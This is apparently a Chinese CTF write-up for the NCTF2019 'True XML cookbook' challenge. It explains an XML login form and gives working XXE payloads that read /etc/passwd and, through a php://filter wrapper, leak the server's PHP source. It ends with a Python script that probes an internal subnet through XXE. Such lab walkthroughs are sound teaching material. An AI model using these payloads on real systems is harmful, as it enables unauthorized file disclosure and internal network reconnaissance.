---
layout: mypost
title: "[NCTF2019]True XML cookbook"
categories: [ctf_wp]
---

（这个题需要对xxe漏洞理解透彻，如果大家还是对xxe漏洞有点懵，可以先去看我的另一篇文章--对xml的亿点理解，这篇文章将从原理到利用，一步一步带大家认识xxe，让大家以后不再害怕它）

（还有就是这道题在buuctf的环境有的时候正常，有的时候出问题）

1.这个题目还是挺新颖的，题目提示了XML，这个题基本上是xxe漏洞了，其实没给的话，一步一步也能分析出来，咱们一步一步往下看，首先进去的话是一个登录框，f12以及看了网络抓包，得到了一个可疑的东西，就是源码里面有这样一串js的代码

```
<script type='text/javascript'> 
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
</script>
```

读过我那篇--对xml的亿点理解的小伙伴，可能一眼就看出来，这个js代码应该是用来给后端发送这个xml的数据的，然后也有处理从后端传到前端的的xml数据，下面具体说一下吧

```
1. 首先，它从页面上的两个元素（ID分别为username和password）中获取用户输入的用户名和密码
2. 然后，它检查用户名和密码是否为空。如果任一为空，它会弹出一个警告并停止执行
3. 如果用户名和密码都不为空，它会创建一个XML格式的数据，然后通过AJAX POST请求发送到doLogin.php
4. 如果请求成功，它会解析返回的XML数据，获取code和msg，并根据code的值更新页面上的.msg元素的文本
5. 如果请求失败，它会更新页面上的.msg元素的文本，显示错误信息
```

2.实锤了这个题目应该就是用xxe来解决的，直接抓个包看一下，这就很明显了，是一个xml的数据格式

![](Screenshot_168.png)

然后我就废话不多说了，直接上payload的吧，如果看不懂的话，先去看我的另一篇文章（唠叨一嘴）

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ELEMENT user ANY >
<!ENTITY  xxe SYSTEM "file:///etc/passwd" >]>
<user><username>&xxe;</username><password>2
</password></user>
```

![](image-20231006173107545-1024x251.png)

下面是response

![](image-20231006173131330.png)

这个题还是很简单的哈，也是正常的有回显的xxe，这样就不用再去搞个公网vps啥的了，当然这个无回显也很简单啦，就是多两行代码的事情

3.然后我就试着去主机的根目录以及去网站的根目录找有没有flag，结果都是以失败告终

![](image-20231006173634169-1024x573.png)

然后想着那就先把这个doLogin.php的源码给扒下来吧，这个当然用file不太行哈，换个伪协议

```
php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php
```

然后就读到base64加密后的字符，解密后就是源码

```
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

这源码屁用没有啊，给了账号密码登上去也没后台，但还是给大家解释一下吧，就当熟悉熟悉这个写法了

```
1. 首先，定义了两个变量 $USERNAME 和 $PASSWORD，这些是预设的用户名和密码
2. libxml_disable_entity_loader(false); 这行代码允许加载外部实体，这可能导致 XML 实体注入（XXE）漏洞！！！
3. $xmlfile = file_get_contents('php://input'); 这行代码从 HTTP 请求体中获取 XML 数据
4. 在 try 块中，使用 DOMDocument 对象加载并解析 XML 数据
5. 使用 simplexml_import_dom 函数将 DOM 对象转换为 SimpleXML 对象，以便更容易地处理
6. 从 XML 数据中提取用户名和密
7. 检查提取的用户名和密码是否与预设的用户名和密码匹配。如果匹配，返回一个 XML 结果，其中包含代码 1 和用户名。如果不匹配，返回一个 XML 结果，其中包含代码 0 和用户名
8. 如果在处理 XML 数据时发生异常，将捕获该异常并返回一个 XML 结果，其中包含代码 3 和异常消息
9. 最后，设置响应的内容类型为 text/html; charset=utf-8，并输出结果
```

4.实在是不会了，去看了一下师傅的wp，才觉悟过来，这个题不仅仅是个简单的xxe，忘记了xxe还能做内网探测，起到了相当于nmap的功能，其实我一开始在读/etc/passwd的时候也去顺便的读了这个/proc/net/arp文件以及/etc/hosts，这个也是再做一道ctf题的经验，甚至去读了用户的操作记录，但都没什么可疑的，但现在回头看，这明显就是buuctf环境有问题，当时在读/proc/net/arp的时候，真的是只显示了一块网卡，但重新开了一个靶机后，结果就是下面这样

![](屏幕截图-2023-10-06-162140-1024x638.png)

竟然显示了两块网卡（这个搞网安的，经常开虚拟机，应该懂什么意思）

5.然后就用http这个协议去探测就行，呜当时看书还想过一下是不是这样搞，md，该死buuctf，一个一个探测肯定不太现实，但是用bp爆破的话，出现了一个问题，就是这个发包之后回显的时间会很长，http没有探测到内容的话，应该马上就会回显相应的提示，我猜测这是出题人故意设置的，但bp好像没法改响应时间（两者可能冲突了，当时bp的反应就是直接卡死不动了，可能也是我的bp有问题吧），所以还是写个python脚本吧，强大的requests库万岁！！！

```
import requests as res
url="http://cb4236ae-2262-46e8-a095-f420887c377f.node4.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.3)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```

然后跑就完了，一会儿就能出结果

![](屏幕截图-2023-10-06-180348-1024x539.png)

Finish!!!